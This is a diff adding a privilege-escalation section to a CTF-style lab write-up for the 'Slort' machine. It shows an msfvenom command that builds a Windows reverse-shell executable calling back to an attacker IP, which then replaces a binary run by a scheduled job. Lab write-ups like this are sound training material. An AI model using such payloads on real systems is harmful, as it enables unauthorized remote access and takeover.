@@ -266,6 +266,23 @@ using  php reverse shell payload , we are able to spawn a reverse shell as user 
 
 ## Privilege Escalation
 
-![Uploading image.png…]()
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2a2b2066-a3ef-4f47-b4b1-dea5ac9402db)
 
-In the `C:\` dir we got a backup dir, checking the content of the directory, we got an EXE file and 
+In the `C:\` dir we got a backup dir, checking the content of the directory, we got an EXE file and info.txt file, checking the info.txt we can see a scheduled job to run every 5 mins. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Slort]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.171 LPORT=443 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+```
+first generate an msfvenom payload to spawn a reverse shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f4606597-c9c3-4651-aa23-09f025147cf0)
+
+replace the binary with our reverse shell payload. and let's wait if we can spawn a reverse shell.
+
